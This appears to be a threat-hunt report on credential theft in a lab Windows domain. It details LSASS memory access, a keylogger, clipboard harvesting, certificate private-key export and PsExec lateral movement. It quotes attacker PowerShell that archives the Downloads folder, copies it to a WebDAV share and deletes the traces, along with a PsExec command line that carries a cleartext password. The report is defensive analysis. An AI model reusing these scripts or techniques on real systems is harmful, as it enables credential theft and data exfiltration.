hypothesis: An adversary who compromised Windows hosts in this network stole credentials from them (MITRE ATT&CK tactic: Credential Access).

frame.restated: An adversary who has compromised Windows hosts on this network stole credentials from those hosts.
frame.what_would_confirm: Observable evidence such as process access to lsass.exe, LSASS memory dumps, SAM/SECURITY/NTDS.dit registry hive extraction, credential-dumping tool execution, or subsequent authentication with stolen credentials.
frame.what_would_refute: Observable absence of LSASS access, credential-dump files, SAM/SECURITY/NTDS.dit reads or exfiltration, credential-dumping tool execution, and no evidence of stolen credentials used elsewhere.

verdict.rationale: The hunt hypothesis is confirmed by multiple verified, high-confidence Credential Access findings on compromised Windows hosts. F01 shows non-system PowerShell and WinRM host processes opening lsass.exe with full/VM-read access on scranton and nashua, consistent with credential dumping via LSASS memory access. F02 shows attacker PowerShell exporting LocalMachine certificate private keys to .pfx files, archiving them, exfiltrating the archive to a WebDAV share, and deleting artifacts. F03 shows Get-Keystrokes/Keystroke-Check keylogger execution in the same pbeesly session, with a minor verification discrepancy due to truncation in the claimed script block but the stored value supports the activity. F04 shows clipboard harvesting in the same compromised session. F05 shows cleartext domain credentials passed on PsExec command lines and reused for lateral movement to nashua. Together these corroborate an adversary stealing credentials from Windows hosts, so the verdict is Confirmed.

findings.title: Non-system PowerShell and WinRM host processes opened lsass.exe with full/VM-read access on scranton and nashua
findings.summary: On SCRANTON.dmevals.local the hidden loader PowerShell.exe (PID 2976, user pbeesly) opened C:\windows\system32\lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff at 2020-05-02T03:05:16Z (Sysmon EID 10; Security 4656 AccessMask 0x1fffff/0x1f3fff; 4663 AccessMask 0x10 = PROCESS_VM_READ). The same pattern repeats on NASHUA.dmevals.local at 2020-05-02T03:09:29Z from wsmprovhost.exe (WinRM remote PowerShell shell) as user pbeesly with AccessMask 0x1f3fff. Elsewhere in the same window lsass handles are only held by system/AV processes (wininit.exe, csrss.exe, svchost.exe 0x1000/0x101001, MsMpEng.exe, CollectGuestLogs.exe), so these two pbeesly handles stand out as lsass memory access used to read credential material.

findings.title: Get-Keystrokes keylogger executed in the pbeesly PowerShell session on scranton
findings.summary: At 2020-05-02T03:06:59Z on SCRANTON.dmevals.local PowerShell PID 3852 (user pbeesly) executed Get-Keystrokes followed by View-Job -JobName "Keystrokes", and at 03:06:47Z the same session ran Keystroke-Check, which enumerates running AV/security products (avp, acs, AvastSvc, nod32krn, ekern ...) before capturing input. The captured keystrokes are a credential-capture primitive used alongside the lsass access in the same session.

problems: claimed value differs from the stored value

findings.title: Clipboard harvested in the same compromised PowerShell session
findings.summary: At 2020-05-02T03:06:42Z on SCRANTON.dmevals.local PowerShell PID 3852 (user pbeesly) ran Get-Clipboard, collecting clipboard contents (frequently passwords) as part of the same credential-collection script set that performed the lsass access and private-key export.

findings.title: Attacker script exported LocalMachine certificate private keys to .pfx files, then archived and exfiltrated the collection
findings.summary: On SCRANTON.dmevals.local user pbeesly loaded C:\Program Files\SysinternalsSuite\readme.ps1 which defines Get-PrivateKeys: it enumerates cert:\LocalMachine, exports every certificate with a thumbprint to $env:USERPROFILE\Downloads\<random>.pfx protected with the hardcoded password "saribas", and writes the keys to disk (Sysmon EID 11 created C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx at 03:04:57Z). The staged private keys were then compressed by psversion.ps1's Invoke-Exfil (Compress-7Zip of the whole Downloads dir into %APPDATA%\OfficeSupplies.7z, created 03:08:35Z) and the archive copied to \\192.168.0.4\webdav before Invoke-BeachCleanup deleted the .pfx/.bmp/.png/.7z artifacts.

verification.actual:
function Invoke-Exfil {

    if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershell -Force }

    Write-Host "[*] Compressing all the things in download dir"
    Compress-7Zip -Path "$env:USERPROFILE\Downloads\" -Filter * -Password "lolol" -ArchiveFileName "$env:APPDATA\OfficeSupplies.7z"

    $UserName = "cozy"
    $Password = "MyCozyPassw0rd!" | ConvertTo-SecureString -AsPlainText -Force
    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password

    $WebDavShare...(truncated)

function Invoke-BeachCleanup {
    Write-Host "[*] Cleaning up"
    Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force
    Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force
    Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force
    Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force
}

findings.title: Cleartext domain credentials for dmevals\pbeesly passed on a command line to PsExec for lateral movement
findings.summary: On SCRANTON.dmevals.local, from the cwd C:\Program Files\SysinternalsSuite, the pbeesly PowerShell session repeatedly ran PsExec64.exe against \\NASHUA with the cleartext password for dmevals\pbeesly on the command line ("-u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe"), first at 03:11:18Z and again at 03:12:25Z, 03:13:28Z and 03:14:42Z. The credential material is exposed in process command lines/logs and was reused to run the dropped implant C:\Windows\Temp\python.exe on nashua under PSEXESVC.
